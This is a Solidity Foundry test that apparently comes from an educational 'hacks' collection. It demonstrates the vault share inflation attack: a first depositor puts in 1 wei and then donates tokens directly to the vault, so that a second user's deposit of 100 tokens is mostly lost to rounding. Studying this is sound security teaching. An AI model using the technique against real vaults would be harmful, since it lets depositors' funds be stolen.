// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {
    IERC20,
    Vault,
    Token
} from "../../../src/hacks/vault-inflation/VaultInflation.sol";

uint8 constant DECIMALS = 18;

// forge test -vvv --match-path Vault.test.sol
contract VaultTest is Test {
    Vault private vault;
    Token private token;

    address[] private users = [address(11), address(12)];

    function setUp() public {
        token = new Token();
        vault = new Vault(address(token));

        for (uint256 i = 0; i < users.length; i++) {
            token.mint(users[i], 10000 * (10 ** DECIMALS));
            vm.prank(users[i]);
            token.approve(address(vault), type(uint256).max);
        }
    }

    function print() private {
        console2.log("vault total supply", vault.totalSupply());
        console2.log("vault balance", token.balanceOf(address(vault)));
        uint256 shares0 = vault.balanceOf(users[0]);
        uint256 shares1 = vault.balanceOf(users[1]);
        console2.log("users[0] shares", shares0);
        console2.log("users[1] shares", shares1);
        console2.log("users[0] redeemable", vault.previewRedeem(shares0));
        console2.log("users[1] redeemable", vault.previewRedeem(shares1));
    }

    function test() public {
        // users[0] deposit 1
        console2.log("--- users[0] deposit ---");
        vm.prank(users[0]);
        vault.deposit(1);
        print();

        // users[0] donate 100
        console2.log("--- users[0] donate ---");
        vm.prank(users[0]);
        token.transfer(address(vault), 100 * (10 ** DECIMALS));
        print();

        // users[1] deposit 100
        console2.log("--- users[1] deposit ---");
        vm.prank(users[1]);
        vault.deposit(100 * (10 ** DECIMALS));
        print();
    }
}
